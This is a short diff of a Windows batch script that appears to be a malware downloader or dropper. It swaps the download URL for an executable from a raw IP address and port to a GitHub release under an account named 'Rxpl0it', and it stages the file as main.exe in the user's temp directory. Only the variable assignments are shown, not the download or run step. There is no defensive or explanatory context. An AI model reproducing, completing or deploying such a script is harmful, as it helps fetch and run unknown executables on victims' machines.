@@ -1,5 +1,5 @@
 @echo off
-set "URL=http://162.19.219.101:3391/download/blabl/main.exe"
+set "URL=https://github.com/Rxpl0it/dwad/releases/download/wa/1.exe"
 set "TEMP_DIR=%TEMP%"
 set "EXE_NAME=main.exe"
 
